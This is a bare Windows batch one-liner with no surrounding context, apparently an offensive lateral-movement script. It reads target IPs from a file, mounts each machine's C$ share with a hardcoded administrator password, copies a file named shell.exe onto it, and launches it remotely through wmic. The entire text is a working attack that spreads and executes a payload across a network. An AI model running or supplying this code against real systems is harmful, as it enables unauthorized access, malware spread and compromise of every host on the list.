for /F %%i in (C:\Windows\ipall.txt) do  @ net use \\%%i\c$ /user:TEST\Administrator "Pa$$w0rd" && copy "C:\Windows\shell.exe" "\\%%i\c$\Windows\shell.exe" 
&& wmic /node:%%i /user:"TEST\Administrator" /password:"Pa$$w0rd" process call create "cmd.exe /c c:\windows\shell.exe"
